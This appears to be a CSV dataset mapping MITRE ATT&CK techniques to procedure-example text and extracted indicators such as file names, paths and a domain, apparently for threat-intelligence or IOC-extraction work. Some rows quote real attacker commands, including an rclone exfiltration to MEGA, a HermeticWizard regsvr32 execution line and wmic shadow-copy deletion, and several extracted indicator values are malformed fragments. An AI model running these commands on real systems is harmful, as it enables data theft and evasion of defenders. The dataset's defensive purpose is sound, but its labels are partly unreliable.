tech_id,tech_name,text,section,ioc,ioc_value
T1574.001,DLL Search Order Hijacking,Prikormka  uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory.   [30],Procedure Examples,file,ntshrui.dll
T1574.001,DLL Search Order Hijacking,"Variants of  WEBC2  achieve persistence by using DLL search order hijacking, usually by copying the DLL file to  %SYSTEMROOT%  ( C:\WINDOWS\ntshrui.dll ).   [37]",Procedure Examples,path,C:\WINDOWS\ntshrui.dll
T1574.001,DLL Search Order Hijacking,"Variants of  WEBC2  achieve persistence by using DLL search order hijacking, usually by copying the DLL file to  %SYSTEMROOT%  ( C:\WINDOWS\ntshrui.dll ).   [37]",Procedure Examples,file,ntshrui.dll
T1070.007,Clear Network Connection History and Configurations,"Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system from behaviors that require network connections, such as  Remote Services  or  External Remote Services . Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.   Network connection history may be stored in various locations on a system. For example, RDP connection history may be stored in Windows Registry values under    [1]   :   Windows may also store information about recent RDP connections in files such as  C:\Users\%username%\Documents\Default.rdp  and  C:\Users\%username%\AppData\Local\Microsoft\TerminalServer Client\Cache\ .   [2]    Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in  /Library/Logs  and/or  /var/log/ ).   [3]      [4]      [5]      Malicious network connections may also require changes to network configuration settings, such as  Disable or Modify System Firewall  or tampering to enable  Proxy . Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",Description,path,C:\Users\%username%\Documents\Default.rdp
T1070.007,Clear Network Connection History and Configurations,"Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system from behaviors that require network connections, such as  Remote Services  or  External Remote Services . Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.   Network connection history may be stored in various locations on a system. For example, RDP connection history may be stored in Windows Registry values under    [1]   :   Windows may also store information about recent RDP connections in files such as  C:\Users\%username%\Documents\Default.rdp  and  C:\Users\%username%\AppData\Local\Microsoft\TerminalServer Client\Cache\ .   [2]    Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in  /Library/Logs  and/or  /var/log/ ).   [3]      [4]      [5]      Malicious network connections may also require changes to network configuration settings, such as  Disable or Modify System Firewall  or tampering to enable  Proxy . Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",Description,path,C:\Users
T1047,Windows Management Instrumentation,Avaddon  uses wmic.exe to delete shadow copies.   [13],Procedure Examples,file,wmic.exe
T1047,Windows Management Instrumentation,Blue Mockingbird  has used wmic.exe to set environment variables.   [17],Procedure Examples,file,wmic.exe
T1047,Windows Management Instrumentation,Emotet  has used WMI to execute powershell.exe.   [34],Procedure Examples,file,powershell.exe
T1047,Windows Management Instrumentation,FIN8 's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution.  FIN8  has also used WMIC for lateral movement as well as during and post compromise cleanup activities.   [41]      [42]      [43],Procedure Examples,file,cmd.exe
T1047,Windows Management Instrumentation,HermeticWizard  can use WMI to create a new process on a remote machine via  C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\&lt;filename&gt;.dll .   [52],Procedure Examples,path,/s /iC:\windows\&lt;filename&gt;.dll
T1047,Windows Management Instrumentation,HermeticWizard  can use WMI to create a new process on a remote machine via  C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\&lt;filename&gt;.dll .   [52],Procedure Examples,path,C:\windows\system32\cmd.exe
T1047,Windows Management Instrumentation,HermeticWizard  can use WMI to create a new process on a remote machine via  C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\&lt;filename&gt;.dll .   [52],Procedure Examples,path,/c start C:\windows\system32\\regsvr32.exe
T1047,Windows Management Instrumentation,HermeticWizard  can use WMI to create a new process on a remote machine via  C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\&lt;filename&gt;.dll .   [52],Procedure Examples,file,cmd.exe
T1047,Windows Management Instrumentation,HermeticWizard  can use WMI to create a new process on a remote machine via  C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\&lt;filename&gt;.dll .   [52],Procedure Examples,file,regsvr32.exe
T1047,Windows Management Instrumentation,HermeticWizard  can use WMI to create a new process on a remote machine via  C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\&lt;filename&gt;.dll .   [52],Procedure Examples,path,C:\windows\system32\\regsvr32.exe
T1047,Windows Management Instrumentation,Meteor  can use  wmic.exe  as part of its effort to delete shadow copies.   [74],Procedure Examples,file,wmic.exe
T1047,Windows Management Instrumentation,Naikon  has used WMIC.exe for lateral movement.   [85],Procedure Examples,file,WMIC.exe
T1047,Windows Management Instrumentation,Octopus  has used wmic.exe for local discovery information.   [89],Procedure Examples,file,wmic.exe
T1047,Windows Management Instrumentation,Remexi  executes received commands with wmic.exe (for WMI commands).    [104],Procedure Examples,file,wmic.exe
T1047,Windows Management Instrumentation,Stuxnet  used WMI with an  explorer.exe  token to execute on a remote share.   [115],Procedure Examples,file,explorer.exe
T1057,Process Discovery,An  APT28  loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.   [7],Procedure Examples,file,explorer.exe
T1057,Process Discovery,FoggyWeb 's loader can enumerate all Common Language Runtimes (CLRs) and running Application Domains in the compromised AD FS server's  Microsoft.IdentityServer.ServiceHost.exe  process.   [103],Procedure Examples,file,Microsoft.IdentityServer.ServiceHost.exe
T1057,Process Discovery,"FunnyDream  has the ability to discover processes, including  Bka.exe  and  BkavUtil.exe .   [106]",Procedure Examples,file,Bka.exe
T1057,Process Discovery,"FunnyDream  has the ability to discover processes, including  Bka.exe  and  BkavUtil.exe .   [106]",Procedure Examples,file,BkavUtil.exe
T1057,Process Discovery,"Meteor  can check if a specific process is running, such as Kaspersky's  avp.exe .   [166]",Procedure Examples,file,avp.exe
T1057,Process Discovery,njRAT  can search a list of running processes for Tr.exe.   [176],Procedure Examples,file,Tr.exe
T1057,Process Discovery,"During  Operation Honeybee , the threat actors obtained a list of running processes on a victim machine using  cmd /c tasklist &gt; %temp%\temp.ini .   [181]",Procedure Examples,path,/c tasklist &gt; %temp%\temp.ini
T1057,Process Discovery,Saint Bot  has enumerated running processes on a compromised host to determine if it is running under the process name  dfrgui.exe .   [184],Procedure Examples,file,dfrgui.exe
T1057,Process Discovery,StrongPity  can determine if a user is logged in by checking to see if explorer.exe is running.   [231],Procedure Examples,file,explorer.exe
T1057,Process Discovery,SUNSPOT  monitored running processes for instances of  MsBuild.exe  by hashing the name of each running process and comparing it to the corresponding value  0x53D525 . It also extracted command-line arguments and individual arguments from the running  MsBuild.exe  process to identify the directory path of the Orion software Visual Studio solution.   [233],Procedure Examples,file,MsBuild.exe
T1057,Process Discovery,Winnti for Windows  can check if the explorer.exe process is responsible for calling its install function.   [261],Procedure Examples,file,explorer.exe
T1567.002,Exfiltration to Cloud Storage,"During  C0015 , the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the  Rclone  command  rclone.exe copy --max-age 2y ""\\SERVER\Shares"" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M .   [3]",Procedure Examples,file,rclone.exe
T1218,System Binary Proxy Execution,Lazarus Group  lnk files used for persistence have abused the Windows Update Client ( wuauclt.exe ) to execute a malicious DLL.   [4]      [5],Procedure Examples,file,wuauclt.exe
T1560,Archive Collected Data,"XCSSET  will compress entire  ~/Desktop  folders excluding all  .git  folders, but only if the total data size is under 200MB.   [50]",Procedure Examples,path,~/Desktop  folders excluding all  .git
T1566.002,Spearphishing Link,Turla  attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.   [103],Procedure Examples,domain,adobe.com
T1074.001,Local Data Staging,"During  C0015 , PowerView's file share enumeration results were stored in the file  c:\ProgramData\found_shares.txt .   [15]",Procedure Examples,path,c:\ProgramData\found_shares.txt
T1074.001,Local Data Staging,Crutch  has staged stolen files in the  C:\AMD\Temp  directory.   [23],Procedure Examples,path,C:\AMD\Temp
T1074.001,Local Data Staging,FrameworkPOS  can identifiy payment card track data on the victim and copy it to a local file in a subdirectory of C:\Windows.   [35],Procedure Examples,path,C:\Windows
